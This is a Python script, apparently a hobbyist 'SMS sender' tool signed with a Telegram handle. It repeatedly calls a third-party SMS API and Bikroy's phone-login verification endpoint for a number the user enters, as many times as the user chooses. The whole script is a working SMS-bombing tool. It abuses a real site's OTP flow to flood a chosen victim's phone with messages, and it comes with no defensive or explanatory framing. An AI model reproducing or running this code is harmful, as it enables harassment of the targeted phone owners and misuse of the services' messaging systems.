import requests
import time
import random
from rich.console import Console
from rich.text import Text

# Console object for printing stylized text
console = Console()

# Base URLs with placeholders
url_1 = "https://api.nsmodz.top/all.php?phone={}"
url_2 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={}"

# List of colors to choose from for banner
colors = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"]

# Function to print text slowly with each character colored
def print_text_slowly(text, speed=0.03):
    for char in text:
        # Choose a random color for each character
        color = random.choice(colors)
        console.print(char, style=color, end='')
        time.sleep(speed)
    console.print()  # For a new line at the end

# A function to send requests
def send_requests(phone_number, num_requests):
    for _ in range(num_requests):
        # Construct URLs with the user-provided phone number
        final_url_1 = url_1.format(phone_number)
        final_url_2 = url_2.format(phone_number)
        
        try:
            # Send request to the first URL
            response_1 = requests.get(final_url_1)
            if response_1.status_code == 200:
                console.print(f"Message sent successfully to {phone_number} - Response Code: {response_1.status_code}", style="green")
            else:
                console.print(f"Error sending message to {phone_number} - Status Code: {response_1.status_code}", style="red")

            # Send request to the second URL
            response_2 = requests.get(final_url_2)
            if response_2.status_code == 200:
                console.print(f"Message sent successfully to {phone_number} - Response Code: {response_2.status_code}", style="green")
            else:
                console.print(f"Error sending message to {phone_number} - Status Code: {response_2.status_code}", style="red")

        except requests.exceptions.RequestException as e:
            # Handle any exceptions that may occur
            console.print(f"An error occurred: {e}", style="bold red")

# Function to print input prompts slowly with alternating colors and get user input
def slow_input(prompt_text, color, speed=0.03):
    text = Text(prompt_text, style=color)  # Use the passed color
    console.print(text, end='')  
    return input()  # Return the user input after the prompt

# Main function to encapsulate script logic
def main():
    # Display banner with slow character printing using rich colors
    print_text_slowly("SMS sender BY CH3COOH1337. Telegram: @ch3cooh1337\n", speed=0.03)

    # Prompt the user for the phone number with green color
    phone_number = slow_input("Enter the phone number (starting with '01' and exactly 11 digits): ", color="green", speed=0.05)

    # Prompt the user for the number of SMS requests with red color
    num_requests = slow_input("Enter the number of SMS requests (each URL will be called this many times): ", color="red", speed=0.05)

    # Ensure the phone number is exactly 11 digits long and convert num_requests to integer
    if len(phone_number) != 11 or not phone_number.startswith('01'):
        console.print("Invalid phone number! Please make sure it starts with '01' and has exactly 11 digits.", style="bold red")
    else:
        try:
            num_requests = int(num_requests)  # Convert input to integer
            # Run the tool
            send_requests(phone_number, num_requests)
        except ValueError:
            console.print("Invalid input for the number of requests. Please enter a valid integer.", style="bold red")